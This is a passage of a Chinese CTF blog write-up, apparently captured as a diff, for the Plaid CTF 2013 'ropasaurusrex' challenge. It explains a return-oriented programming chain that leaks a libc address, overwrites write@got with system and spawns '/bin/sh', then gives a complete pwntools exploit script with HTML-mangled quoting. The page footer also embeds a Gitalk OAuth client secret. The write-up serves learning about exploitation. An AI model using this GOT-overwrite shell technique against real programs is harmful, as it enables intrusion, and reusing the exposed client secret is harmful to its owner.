class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 在某处生成字符串&quot;&#x2F;bin&#x2F;sh\0&quot;</span><br><span class="line"></span><br><span class="line">   将read(STDIN, .data, 8)加载到stack上</span><br><span class="line"></span><br><span class="line">4. 将某个GOT重写为system@libc</span><br><span class="line"></span><br><span class="line">   将read(STDIN, got_write, 4)加载到stack上</span><br><span class="line"></span><br><span class="line">5. 使用参数&quot;&#x2F;bin&#x2F;sh&quot;调用被修改GOT的函数</span><br><span class="line"></span><br><span class="line">   将write(.data)加载到stack上，这等价于system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line"></span><br><span class="line">也就是说，整个流程要加载到stack伤的数据如下：</span><br><span class="line"></span><br><span class="line">![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041801.jpg)</span><br><span class="line"></span><br><span class="line">- 发送这段数据，会调用plt_write()</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041802.jpg)</span><br><span class="line"></span><br><span class="line">- 通过plt_write()泄漏地址，攻击者可以获取4个字节</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041803.jpg)</span><br><span class="line"></span><br><span class="line">- 根据获取的数据计算出system的地址</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041804.jpg)</span><br><span class="line"></span><br><span class="line">- 因为二进制程序正在等待数据读取，首先准备&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041805.jpg)</span><br><span class="line"></span><br><span class="line">- 再次读取，使用计算出的system地址重写write@got</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041806.jpg)</span><br><span class="line"></span><br><span class="line">- 通过GOT Overwrite使得write&#x3D;system，之后调用write(.data)</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041807.jpg)</span><br><span class="line"></span><br><span class="line">- 实际调用的是system(&quot;&#x2F;bin&#x2F;sh&quot;)，getshell</span><br><span class="line"></span><br><span class="line">  ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041808.jpg)</span><br><span class="line"></span><br><span class="line">## exploit</span><br><span class="line"></span><br><span class="line">最终完整exploit代码如下：</span><br></pre></td></tr></table></figure>
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+</code></pre></li>
+</ul>
+<p>from pwn import *</p>
+<p>context(os=’linux’, arch=’i386’)</p>
+<h1 id="context-log-level-‘debug’-output-verbose-log"><a href="#context-log-level-‘debug’-output-verbose-log" class="headerlink" title="context.log_level = ‘debug’  # output verbose log"></a>context.log_level = ‘debug’  # output verbose log</h1><p>RHOST = “localhost”<br>RPORT = 1025<br>LHOST = “127.0.0.1”<br>LPORT = 1025</p>
+<h1 id="libc-ELF-‘’"><a href="#libc-ELF-‘’" class="headerlink" title="libc = ELF(‘’)"></a>libc = ELF(‘’)</h1><p>elf = ELF(‘./ropasaurusrex’)</p>
+<p>def section_addr(name, elf=elf):<br>    return elf.get_section_by_name(name).header[‘sh_addr’]</p>
+<p>conn = None<br>if len(sys.argv) &gt; 1:<br>    if sys.argv[1] == ‘r’:<br>        conn = remote(RHOST, RPORT)<br>    elif sys.argv[1] == ‘l’:<br>        conn = remote(LHOST, LPORT)</p>
+<pre><code>if &apos;main&apos; in elf.symbols.keys() else elf.entrypoint))
+    conn = gdb.debug([&apos;./ropasaurusrex&apos;], execute=execute)</code></pre><p>else:<br>    conn = process([‘./ropasaurusrex’])</p>
+<h1 id="preparing-for-exploitation"><a href="#preparing-for-exploitation" class="headerlink" title="preparing for exploitation"></a>preparing for exploitation</h1><p>write_plt = 0x0804830c<br>read_plt = 0x0804832c<br>pop3ret = 0x80484b6<br>write_got = 0x8049614<br>read_got = 0x804961c<br>data = 0x08049620<br>system_offset = 0x0003d200<br>write_offset = 0x000e6d80</p>
+<p>log.info(‘Pwning’)</p>
+<p>buf = ‘A’ * 140</p>
+<h1 id="write-STDOUT-got-write-4"><a href="#write-STDOUT-got-write-4" class="headerlink" title="write(STDOUT, got_write, 4)"></a>write(STDOUT, got_write, 4)</h1><p>buf += p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)</p>
+<h1 id="read-STDIN-data-8"><a href="#read-STDIN-data-8" class="headerlink" title="read(STDIN, data, 8)"></a>read(STDIN, data, 8)</h1><p>buf += p32(read_plt) + p32(pop3ret) + p32(0) +p32(data) + p32(8)</p>
+<h1 id="read-STDIN-got-write-4"><a href="#read-STDIN-got-write-4" class="headerlink" title="read(STDIN, got_write, 4)"></a>read(STDIN, got_write, 4)</h1><p>buf += p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)</p>
+<h1 id="write-data-system-“-bin-sh”"><a href="#write-data-system-“-bin-sh”" class="headerlink" title="write(data) # system(“/bin/sh”)"></a>write(data) # system(“/bin/sh”)</h1><p>buf += p32(write_plt) + p32(0xdeadbeef) + p32(data)</p>
+<p>conn.sendline(buf)<br>ret = u32(conn.recv())<br>print(‘write@got: {}’.format(hex(ret)))<br>print(‘libc_start: {}’.format(hex(ret - write_offset)))<br>system_addr = ret - write_offset + system_offset<br>print(‘system: {}’.format(hex(system_addr)))</p>
+<p>conn.send(‘/bin/sh’+’\x00’)</p>
+<p>buf = p32(system_addr)<br>conn.send(buf)</p>
+<p>conn.interactive()</p>
+<pre><code>
+按照上述动态调试环境测试运行，pwned：
+
+{% image https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041901.jpg 'img' '' %}
+</code></pre>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-04-19T02:45:45.017Z" itemprop="dateUpdated">2019-04-19 10:45:45</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/&title=《Plaid CTF 2013 - pwn200 – ropasaurusrex》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/&title=《Plaid CTF 2013 - pwn200 – ropasaurusrex》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Plaid CTF 2013 - pwn200 – ropasaurusrex》 — 喵喵喵喵&url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/04/22/ropasaurusrex-level2/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">ropasaurusrex level2</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/04/15/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B014-stack-pivot%E4%B8%8EOff-by-one/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Pwn学习笔记14:stack pivot与Off-by-one</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/&title=《Plaid CTF 2013 - pwn200 – ropasaurusrex》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/&title=《Plaid CTF 2013 - pwn200 – ropasaurusrex》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Plaid CTF 2013 - pwn200 – ropasaurusrex》 — 喵喵喵喵&url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuElEQVR42u3aQXIiMRAEQP//0+zVG46Bqu4RcMg5ERhLSh0kTal/fuLn8ev5+83f56qFvM2rXn5OPHh4eHiLoV8194ifFp8PfTi5eHh4eMd4SXP5Ovx8oZ/11f4GDw8P79t4LWO2tWymCQ8PD+87efvg4Hnvz8F4eHh4n+Xly3QSzrZbSB5tHMxa8PDw8Lr7qTpi+OznI/d7eHh4eOtb9fZyq/1rfrk1HC0eHh7eAV6+4M6Oucla3R6a23Hi4eHh3cvLl+l2oElBVR5k5NvGf5/x8PDwDvPyYeUR7ey43E5EkU/j4eHh3cqbFVRtMLPcNT/i4+Hh4b2TVxc2rYsG9i1nwQseHh7eljd74R8u06PIeBYcv9ge8PDw8Ba82UE5X8Q3g2un5sXNHh4eHt5NvLsG1BYZtHHwrBwBDw8P7wQvL2zKfzMLO/KigaIdPDw8vGO89iKqLS9oiw82gchlGIGHh4d3Ky9Zgp8v3MP8+KYNILrfw8PDwzvAyw/Q7bF7U7bVbjBFTRkeHh7empcvzXks+3yraKOQdorx8PDwTvDyhTs/5uZlVcnU5JtWXVOGh4eHN+K1UeymMCsZbh5GrN4Y8PDw8Ba8/QXVDZHBusf8aI6Hh4e357XhwmwQSRzcHuvrdwU8PDy8m3htHDAb4uzI3kbDRY94eHh4a94+ik2i3vw3Lf7F/+Lh4eG9ndceiPOjcJuUtOUIeHh4eKd5dxVUbbaTTTR8+Q0eHh7erbxH+bTxQRsBt9vAizbx8PDwDvBmV/6bKWiv/9tLr9nWgoeHh9fy9k3PnnwzaDcGPDw8vPfwZgt6EvXO9qhNwcFlSo2Hh4f3UV4bwuZLeX4EjwoI8PDw8L6Ytwkv2gN3Mbl4eHh4x3h5921n+y1kczGGh4eHd4LXvvBvFvG7SgFuuNPDw8PDm/D+AQxbnHGGjFduAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
